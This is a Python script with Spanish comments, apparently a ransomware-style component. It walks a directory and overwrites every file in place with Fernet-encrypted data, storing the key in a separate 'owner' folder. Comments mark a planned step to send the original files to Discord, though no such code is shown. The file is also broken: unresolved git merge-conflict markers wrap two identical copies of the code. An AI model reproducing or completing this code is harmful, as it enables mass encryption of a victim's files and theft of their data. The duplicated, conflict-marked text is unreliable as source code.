<<<<<<< HEAD
import os
from cryptography.fernet import Fernet, InvalidToken # type: ignore

from colorama import Fore, init# type: ignore
import time

# Inicializa colorama para usar colores en la consola
init(autoreset=True)

# Definición de estilos de mensaje
advertencia = f"\n\n{Fore.WHITE}[{Fore.YELLOW}!{Fore.WHITE}] {Fore.WHITE}"
success = f"{Fore.WHITE}[{Fore.GREEN}+{Fore.WHITE}] {Fore.WHITE}"
waiting = f"{Fore.WHITE}[{Fore.YELLOW}-{Fore.WHITE}] {Fore.WHITE}"

# Función para crear y guardar la key
def crear_key():
    # Genera la clave
    key = Fernet.generate_key()

    base_dir = os.getcwd()
    owner_dir = os.path.join(base_dir, "owner")
    os.makedirs(owner_dir, exist_ok=True)  
    objetivo_path = f"{owner_dir}\\obj.txt"
    # Lee el contenido de obj.txt para obtener la ruta completa del archivo
    with open(objetivo_path, 'r', encoding="UTF-8") as archivo:
        ruta_completa = archivo.read().strip()  # Elimina espacios en blanco o saltos de línea
    
    # Extrae el nombre del archivo desde la ruta completa
    nombre_archivo = os.path.basename(ruta_completa)
    
    # Ruta completa del archivo de clave en la carpeta 'owner'
    key_path = os.path.join(owner_dir, f"{nombre_archivo}.txt")
    
    # Guarda la clave en el archivo dentro de la carpeta 'owner'
    with open(key_path, 'wb') as key_file:
        key_file.write(key)
        #Funcion para mandar el archivo original a discord.
    # Imprime el mensaje con la ruta completa donde se guardó la clave
    print(f"Clave guardada en: {key_path}")
    
    return key_path, ruta_completa

# Función para encriptar un archivo usando la key
def encriptar_archivo(archivo, fernet):
    with open(archivo, 'rb') as file:
        data = file.read()  # Lee el contenido del archivo

    encrypted_data = fernet.encrypt(data)  # Encripta el contenido

    with open(archivo, 'wb') as file:
        file.write(encrypted_data)  # Sobrescribe el archivo con los datos encriptados
        #Funcion para mandar el archivo original a discord.
    # Obtiene solo el nombre del archivo
    nombre_archivo = os.path.basename(archivo)
    print(f"{success}{Fore.LIGHTYELLOW_EX}{nombre_archivo} {Fore.WHITE} fue encriptado correctamente!")
    
# Función para encriptar todos los archivos en un directorio
def encriptar_directorio(ruta):
    print(f"{Fore.CYAN}CTRL + C para cancelar la acción...")
    time.sleep(2)
    print(f"\n{Fore.LIGHTRED_EX}------------------------------ LOGS ENCRIPTACIÓN ------------------------------\n\n")

    # Llama a crear_key y descompone el tuple
    key_path, ruta_completa = crear_key()  # Crea y guarda la clave

    # Ahora usa solo 'key_path' para abrir la clave
    with open(key_path, 'rb') as key_file:
        clave = key_file.read()  # Lee la clave

    fernet = Fernet(clave)  # Crea una instancia de Fernet con la clave

    # Verifica si la ruta del directorio existe
    if not os.path.exists(ruta):
        print(f"{advertencia}La ruta '{ruta}' no existe.")
        return

    # Recorre el directorio y encripta archivos
    for root, _, archivos in os.walk(ruta):
        for archivo in archivos:
            if archivo:  # Verifica que el archivo no esté vacío
                ruta_completa = os.path.join(root, archivo)  # Genera la ruta completa del archivo
                print(f"{waiting}Encriptando archivo: {ruta_completa}")
                encriptar_archivo(ruta_completa, fernet)  # Encripta cada archivo
            else:
                print(f"{advertencia}No hay archivos en el directorio.")
=======
import os
from cryptography.fernet import Fernet, InvalidToken # type: ignore

from colorama import Fore, init# type: ignore
import time

# Inicializa colorama para usar colores en la consola
init(autoreset=True)

# Definición de estilos de mensaje
advertencia = f"\n\n{Fore.WHITE}[{Fore.YELLOW}!{Fore.WHITE}] {Fore.WHITE}"
success = f"{Fore.WHITE}[{Fore.GREEN}+{Fore.WHITE}] {Fore.WHITE}"
waiting = f"{Fore.WHITE}[{Fore.YELLOW}-{Fore.WHITE}] {Fore.WHITE}"

# Función para crear y guardar la key
def crear_key():
    # Genera la clave
    key = Fernet.generate_key()

    base_dir = os.getcwd()
    owner_dir = os.path.join(base_dir, "owner")
    os.makedirs(owner_dir, exist_ok=True)  
    objetivo_path = f"{owner_dir}\\obj.txt"
    # Lee el contenido de obj.txt para obtener la ruta completa del archivo
    with open(objetivo_path, 'r', encoding="UTF-8") as archivo:
        ruta_completa = archivo.read().strip()  # Elimina espacios en blanco o saltos de línea
    
    # Extrae el nombre del archivo desde la ruta completa
    nombre_archivo = os.path.basename(ruta_completa)
    
    # Ruta completa del archivo de clave en la carpeta 'owner'
    key_path = os.path.join(owner_dir, f"{nombre_archivo}.txt")
    
    # Guarda la clave en el archivo dentro de la carpeta 'owner'
    with open(key_path, 'wb') as key_file:
        key_file.write(key)
        #Funcion para mandar el archivo original a discord.
    # Imprime el mensaje con la ruta completa donde se guardó la clave
    print(f"Clave guardada en: {key_path}")
    
    return key_path, ruta_completa

# Función para encriptar un archivo usando la key
def encriptar_archivo(archivo, fernet):
    with open(archivo, 'rb') as file:
        data = file.read()  # Lee el contenido del archivo

    encrypted_data = fernet.encrypt(data)  # Encripta el contenido

    with open(archivo, 'wb') as file:
        file.write(encrypted_data)  # Sobrescribe el archivo con los datos encriptados
        #Funcion para mandar el archivo original a discord.
    # Obtiene solo el nombre del archivo
    nombre_archivo = os.path.basename(archivo)
    print(f"{success}{Fore.LIGHTYELLOW_EX}{nombre_archivo} {Fore.WHITE} fue encriptado correctamente!")
    
# Función para encriptar todos los archivos en un directorio
def encriptar_directorio(ruta):
    print(f"{Fore.CYAN}CTRL + C para cancelar la acción...")
    time.sleep(2)
    print(f"\n{Fore.LIGHTRED_EX}------------------------------ LOGS ENCRIPTACIÓN ------------------------------\n\n")

    # Llama a crear_key y descompone el tuple
    key_path, ruta_completa = crear_key()  # Crea y guarda la clave

    # Ahora usa solo 'key_path' para abrir la clave
    with open(key_path, 'rb') as key_file:
        clave = key_file.read()  # Lee la clave

    fernet = Fernet(clave)  # Crea una instancia de Fernet con la clave

    # Verifica si la ruta del directorio existe
    if not os.path.exists(ruta):
        print(f"{advertencia}La ruta '{ruta}' no existe.")
        return

    # Recorre el directorio y encripta archivos
    for root, _, archivos in os.walk(ruta):
        for archivo in archivos:
            if archivo:  # Verifica que el archivo no esté vacío
                ruta_completa = os.path.join(root, archivo)  # Genera la ruta completa del archivo
                print(f"{waiting}Encriptando archivo: {ruta_completa}")
                encriptar_archivo(ruta_completa, fernet)  # Encripta cada archivo
            else:
                print(f"{advertencia}No hay archivos en el directorio.")
>>>>>>> 50d7d16cfe24721f70808753e33f4cc7d70e4f11
